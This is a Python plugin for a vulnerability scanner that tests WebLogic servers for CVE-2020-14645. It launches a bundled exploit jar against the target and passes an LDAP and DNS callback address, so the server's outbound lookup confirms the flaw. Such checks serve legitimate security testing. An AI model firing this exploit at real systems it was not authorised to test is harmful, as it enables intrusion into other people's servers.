# !/usr/bin/env python3
# @Time    : 2020/7/26
# @Author  : caicai
# @File    : weblogic_cve_2020_14645.py

from myscan.lib.hostscan.pocbase import PocBase
from myscan.lib.core.data import paths
from myscan.lib.hostscan.common import start_process
from myscan.lib.core.common import get_random_str
from myscan.lib.core.common_reverse import generate, query_reverse
import os

'''
支持ldap的tcp,dnslog检测
'''


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详见 Class3-hostscan开发指南.md
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.addr = self.dictdata.get("addr")  # type:str
        self.port = self.dictdata.get("port")  # type:int
        # 以下根据实际情况填写
        self.name = "weblogic_cve_2020_14645"
        self.vulmsg = "detail: https://mp.weixin.qq.com/s/NL9o7MVG8j8zikeGUfTsVA"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.require = {
            "service": ["http", "https"],
            "type": "tcp"
        }
        # 自定义参数

    def verify(self):
        if not self.check_rule(self.dictdata, self.require):  # 检查是否满足测试条件
            return
        # 判断weblogic
        if "weblogic" not in "".join(self.dictdata.get("service").values()).lower():
            return
        jarfile = os.path.join(paths.MYSCAN_HOSTSCAN_BIN, "weblogic", "CVE-2020-14645.jar")
        ldapaddr, ldaphexdata = generate(self.addr + get_random_str(6), "ldap")
        _, dnshexdata = generate(self.addr + get_random_str(6), "dns")
        protocol = "https" if "https" in "".join(self.dictdata.get("service").keys()) else "http"
        start_process(["java", "-jar", jarfile, ldapaddr.replace("ldap://", "", 1),
                       "{protocol}://{addr}:{port}/".format(protocol=protocol, **self.dictdata)])
        start_process(["java", "-jar", jarfile, dnshexdata,
                       "{protocol}://{addr}:{port}/".format(protocol=protocol, **self.dictdata)])
        for i, hexdata in enumerate((ldaphexdata, dnshexdata)):
            sleep = True if i == 0 else False
            res, data = query_reverse(hexdata, sleep)
            if res:
                self.result.append({
                    "name": self.name,
                    "url": "tcp://{}:{}".format(self.addr, self.port),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others": "found {} in reverse log ".format(hexdata)
                    }
                })
                break
